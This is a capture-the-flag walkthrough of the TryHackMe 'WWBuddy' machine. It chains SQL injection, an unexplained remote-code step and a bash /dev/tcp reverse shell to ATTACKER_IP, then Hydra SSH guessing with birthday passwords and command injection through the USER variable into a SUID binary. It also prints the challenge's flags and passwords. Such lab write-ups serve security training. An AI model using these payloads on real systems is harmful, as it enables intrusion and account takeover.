# TryHackMe - WWBuddy

> **Category:** Linux | Web Security
>
> **Difficulty:** Medium
>
> **Objective:** Enumerate the World Wide Buddy web application, exploit authentication weaknesses, gain remote code execution, perform lateral movement across users, and escalate privileges to obtain root access.

---

# Scenario

In this challenge we are presented with **World Wide Buddy (WWBuddy)**, a social messaging platform running on a Linux server. The application allows users to register, chat with each other, and manage their profiles.

At first glance the application appears fairly simple, but multiple vulnerabilities exist throughout the application. By chaining together SQL Injection, information disclosure, remote code execution, credential harvesting, password guessing, and a vulnerable SUID binary, full system compromise can be achieved.

The challenge demonstrates a realistic attack chain involving both web exploitation and Linux privilege escalation.

---

# Investigation Methodology

```
Host Discovery
        │
        ▼
Port Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
SQL Injection
        │
        ▼
User Enumeration
        │
        ▼
Directory Enumeration
        │
        ▼
Information Disclosure
        │
        ▼
Remote Code Execution
        │
        ▼
Credential Discovery
        │
        ▼
SSH Access
        │
        ▼
Password Guessing
        │
        ▼
SUID Analysis
        │
        ▼
Binary Reverse Engineering
        │
        ▼
Environment Variable Injection
        │
        ▼
Root
```

---

# Target Information

Target IP

```text
10.49.135.9
```

---

# Initial Enumeration

The first stage consisted of identifying exposed network services.

```bash
nmap -p- 10.49.135.9
```

Results:

```text
22/tcp

80/tcp
```

Only SSH and HTTP were exposed.

The next step involved version detection.

---

# Service Enumeration

```bash
nmap -sC -sV 10.49.135.9
```

Results:

| Port | Service | Version |
|------|----------|----------|
|22|SSH|OpenSSH 7.6p1|
|80|HTTP|Apache 2.4.29|

HTTP Information:

```text
Title

Login
```

The login page redirected users to:

```
/login/
```

Additional observations:

- PHP Sessions enabled
- HttpOnly flag missing
- Apache running on Ubuntu

Since only a web application was exposed, further investigation focused on HTTP.

---

# Initial Web Enumeration

Opening the application revealed a registration page.

A new user account was created successfully.

```
Username

WWBuddy

Password

123456789
```

After logging in the application exposed a simple messaging platform where users could exchange messages.

Initially no sensitive information appeared within the chat system.

---

# SQL Injection

While reviewing the profile update functionality, the application appeared to directly process user supplied input.

Testing classic authentication payloads eventually revealed that the application was vulnerable.

Example payload:

```sql
admin' OR 1=1 -- -
```

---

## Analysis

The injected condition causes the SQL statement to evaluate as true.

Rather than updating only the current user, the database query affects every matching record.

After changing the password using the injected payload, authentication became possible using:

```
WWBuddy

123456789
```

This confirms the presence of a SQL Injection vulnerability affecting the authentication workflow.

---

# User Enumeration

Logging into the dashboard exposed additional usernames.

Recovered users:

```
Henry

Roberto
```

Although the messaging system initially revealed little useful information, these usernames became important later in the assessment.

---

# Directory Enumeration

Gobuster was used to identify hidden application resources.

```bash
gobuster dir \
-u http://10.49.135.9 \
-w /usr/share/wordlists/dirb/big.txt
```

Interesting directories:

```text
/admin

/api

/change

/profile

/register
```

Despite discovering the administrative directory, direct access remained restricted.

---

# Internal Messages

After logging in as **Roberto**, additional messages became visible.

One message stated:

> Well, I think you should change the default password for our accounts in SSH, the employee birthday isn't a secure password.

---

## Analysis

Although no password was disclosed directly, this message reveals an important clue.

Employee birthdays are being used as SSH passwords.

This information later becomes critical during privilege escalation.

---

# Henry's Account

Accessing Henry's account revealed another interesting page.

```
/admin
```

Response:

```
Hey Henry,

I didn't make the admin functions for this page yet,

but at least you can see who's trying to sniff into our site here.
```

Displayed information:

```text
192.168.0.139

WWBuddy

fc18e5f4aa09bbbb7fdedf5e277dda00
```

```text
192.168.0.139

Roberto

b5ea6181006480438019e76f8100249e
```

---

## Analysis

The page appears to log user activity.

Each record contains:

- IP Address
- Timestamp
- Username
- Identifier

Although these values initially resemble hashes, they primarily serve as application identifiers rather than immediately useful credentials.

The page also exposes the first challenge flag within an HTML comment.

```html
<!--THM{d0nt_try_4nyth1ng_funny}-->
```

---

# Remote Code Execution

Further testing of the application revealed that server-side commands could be executed.

To obtain an interactive shell, a reverse shell script was prepared.

Example payload:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

A Python web server hosted the payload.

```bash
python3 -m http.server 8000
```

A Netcat listener waited for the incoming connection.

```bash
nc -lvnp 4444
```

After triggering the vulnerability, a reverse shell was successfully obtained.

---

## Shell Stabilization

The shell was upgraded.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This provides:

- Tab completion
- Proper terminal interaction
- Interactive shell

---

# Credential Discovery

While exploring the compromised server, SQL logs revealed credentials belonging to another user.

Recovered password:

```text
yVnocsXsf%X68wf
```

These credentials allowed access to the **Roberto** account.

---

# Roberto

Inside Roberto's home directory a note was discovered.

```text
importante.txt
```

Contents:

```text
Jenny is going to be so happy when she finds out she got the job.

Don't forget she turns 26 next week.

When she sees the gift I bought her,

she might even agree to go on a date with me.
```

User flag:

```text
THM{g4d0_d+_kkkk}
```

---

## Analysis

The note provides valuable contextual information.

Combined with the file modification timestamp:

```bash
stat importante.txt
```

the approximate birth year of Jenny can be estimated.

Since the note dates to **2020** and Jenny is about to turn **26**, her birth year is approximately **1994**.

---

# Password Guessing

The application previously revealed that employee birthdays are used as SSH passwords.

Based on the estimated birthday, a custom password list was created.

```
08/01/1994

08/02/1994

08/03/1994

08/04/1994

08/05/1994

08/06/1994

08/07/1994

08/08/1994

08/09/1994
```

Hydra was used against SSH.

```bash
hydra \
-l jenny \
-P pass.txt \
ssh://TARGET
```

Recovered credentials:

```text
Username

jenny

Password

08/03/1994
```

---

## Analysis

The challenge reinforces how weak password policies and predictable password patterns significantly reduce attack complexity.

Rather than brute-forcing millions of passwords, contextual information narrowed the search space to only a few possibilities.

---

# Privilege Escalation

Logged in as Jenny, standard privilege escalation enumeration began.

Searching for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

An unusual executable was identified.

```text
/bin/authenticate
```

This binary does not normally exist on Ubuntu systems.

---

# Binary Analysis

The binary was copied locally and analysed using **Ghidra**.

Reverse engineering revealed the following logic.

```
If UID < 1000

↓

Exit

Else

↓

Execute:

groups | grep developer

↓

If already developer

↓

Exit

Else

↓

Read USER environment variable

↓

Execute:

usermod -G developer <USER>
```

---

## Analysis

The binary constructs a system command using the value stored inside the **USER** environment variable.

Because this value is never sanitised, arbitrary commands can be injected.

This represents **Command Injection** inside a privileged SUID binary.

---

# Exploitation

The USER environment variable was modified.

```bash
export USER="$USER;bash"
```

Executing the vulnerable binary:

```bash
/bin/authenticate
```

Result:

```text
root
```

A root shell was successfully obtained.

---

# Root Flag

```text
THM{ch4ng3_th3_3nv1r0nm3nt}
```

---

# Flags

## User Flag

```text
THM{g4d0_d+_kkkk}
```

---

## Root Flag

```text
THM{ch4ng3_th3_3nv1r0nm3nt}
```

---

# Attack Chain

```text
Nmap
    │
    ▼
User Registration
    │
    ▼
SQL Injection
    │
    ▼
Dashboard Access
    │
    ▼
Directory Enumeration
    │
    ▼
Information Disclosure
    │
    ▼
Remote Code Execution
    │
    ▼
Reverse Shell
    │
    ▼
Credential Discovery
    │
    ▼
Roberto
    │
    ▼
Birthday Enumeration
    │
    ▼
SSH Password Guessing
    │
    ▼
Jenny
    │
    ▼
SUID Enumeration
    │
    ▼
Ghidra Analysis
    │
    ▼
Environment Variable Injection
    │
    ▼
Root
```

---

# Vulnerabilities Identified

- SQL Injection
- Weak Authentication
- Information Disclosure
- Poor Password Policy
- Predictable SSH Passwords
- Remote Code Execution
- Credential Exposure
- Weak Operational Security
- Vulnerable SUID Binary
- Command Injection
- Environment Variable Injection

---

# Conclusion

This machine demonstrates how multiple seemingly independent weaknesses can be chained together to achieve full system compromise. The attack began with SQL Injection to manipulate authentication, followed by user enumeration and directory discovery that exposed additional application functionality. Information disclosed through internal messages revealed poor password practices, while exploitation of a server-side vulnerability provided remote code execution and access to sensitive credentials.

Lateral movement to the **Roberto** and **Jenny** accounts relied on operational mistakes, including password reuse and predictable birthday-based passwords. Finally, analysis of a custom SUID binary using Ghidra uncovered an unsanitized environment variable that allowed command injection and resulted in a root shell.

The challenge highlights the importance of secure input validation, strong authentication policies, careful handling of privileged binaries, and avoiding predictable credentials. Together, these weaknesses formed a complete attack path from unauthenticated web access to full root compromise.
